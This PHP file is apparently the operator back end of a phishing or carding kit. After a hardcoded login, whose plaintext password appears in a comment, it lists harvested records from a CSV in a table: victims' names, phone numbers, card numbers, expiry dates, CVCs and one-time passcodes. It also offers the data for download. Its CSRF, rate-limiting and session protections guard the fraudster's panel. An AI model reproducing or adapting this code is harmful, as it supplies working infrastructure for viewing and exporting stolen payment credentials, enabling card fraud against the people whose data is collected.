<?php
// Secure password hash - in production, this should be in a secure config file
$USER = 'Jehad533@@';
$PASS_HASH = '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi'; // Hash of 'admin533@@'

// Enhanced session security
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
ini_set('session.use_strict_mode', 1);
session_start();

// Simple rate limiting
$max_attempts = 5;
$lockout_time = 300; // 5 minutes

if (!isset($_SESSION['login_attempts'])) {
    $_SESSION['login_attempts'] = 0;
    $_SESSION['last_attempt'] = 0;
}

// Check if user is locked out
if ($_SESSION['login_attempts'] >= $max_attempts) {
    $time_left = $lockout_time - (time() - $_SESSION['last_attempt']);
    if ($time_left > 0) {
        die('<div style="color:red;text-align:center;margin-top:20px;">Too many failed attempts. Try again in ' . ceil($time_left / 60) . ' minutes.</div>');
    } else {
        $_SESSION['login_attempts'] = 0;
    }
}

// CSRF protection
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

if (isset($_POST['user']) && isset($_POST['pass'])) {
    // Check CSRF token
    if (!isset($_POST['csrf_token']) || !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
        die('<div style="color:red;text-align:center;margin-top:20px;">Invalid request. Please try again.</div>');
    }
    
    // Input validation and sanitization
    $username = filter_var($_POST['user'], FILTER_SANITIZE_STRING);
    $password = $_POST['pass'];
    
    if ($username === $USER && password_verify($password, $PASS_HASH)) {
        $_SESSION['logged'] = true;
        $_SESSION['login_attempts'] = 0; // Reset attempts on successful login
        // Regenerate session ID to prevent session fixation
        session_regenerate_id(true);
    } else {
        $_SESSION['login_attempts']++;
        $_SESSION['last_attempt'] = time();
        echo '<div style="color:red;text-align:center;margin-top:20px;">Invalid login</div>';
    }
}

if (isset($_GET['logout'])) {
    // Secure logout
    $_SESSION = array();
    if (ini_get("session.use_cookies")) {
        $params = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000,
            $params["path"], $params["domain"],
            $params["secure"], $params["httponly"]
        );
    }
    session_destroy();
    header('Location: admin.php');
    exit;
}

if (!isset($_SESSION['logged'])) {
    echo '<div style="max-width:300px;margin:50px auto;padding:20px;border:1px solid #ccc;border-radius:8px;text-align:center;font-family:Arial;">
            <h3>Admin Login</h3>
            <form method="POST">
                <input name="user" placeholder="Username" style="width:100%;padding:8px;margin-bottom:10px;" required><br>
                <input name="pass" type="password" placeholder="Password" style="width:100%;padding:8px;margin-bottom:10px;" required><br>
                <input type="hidden" name="csrf_token" value="' . htmlspecialchars($_SESSION['csrf_token']) . '">
                <button type="submit" style="padding:8px 16px;background:#333;color:#fff;border:none;border-radius:4px;">Login</button>
            </form>
          </div>';
    exit;
}

$file = __DIR__ . '/data.csv';
$data = [];
if (file_exists($file)) {
    $rows = array_map('str_getcsv', file($file));
    $data = $rows;
}

echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Admin Panel</title>
<style>
body {font-family: Arial, sans-serif; margin: 20px; background: #f4f4f4;}
h2 {text-align:center;}
a.button {display:inline-block;margin:10px;padding:10px 20px;background:#007bff;color:#fff;text-decoration:none;border-radius:4px;}
a.button:hover {background:#0056b3;}
table {width:100%;border-collapse:collapse;background:#fff;margin-top:20px;}
th, td {border:1px solid #ddd;padding:10px;text-align:center;}
th {background:#007bff;color:white;}
tr:nth-child(even){background:#f2f2f2;}
</style></head><body>';

echo '<h2>Admin Panel</h2>';
echo '<div style="text-align:center;">';
echo '<a href="data.csv" class="button" download>Download CSV</a>';
echo '<a href="?logout=1" class="button" style="background:#dc3545;">Logout</a>';
echo '</div>';

echo '<table><tr>
        <th>Date</th><th>Phone</th><th>Amount</th>
        <th>Name</th><th>Card Number</th><th>Expiry</th><th>CVC</th><th>OTP</th></tr>';
foreach ($data as $row) {
    echo '<tr>';
    foreach ($row as $col) {
        echo '<td>' . htmlspecialchars($col) . '</td>';
    }
    echo '</tr>';
}
echo '</table></body></html>';
?>
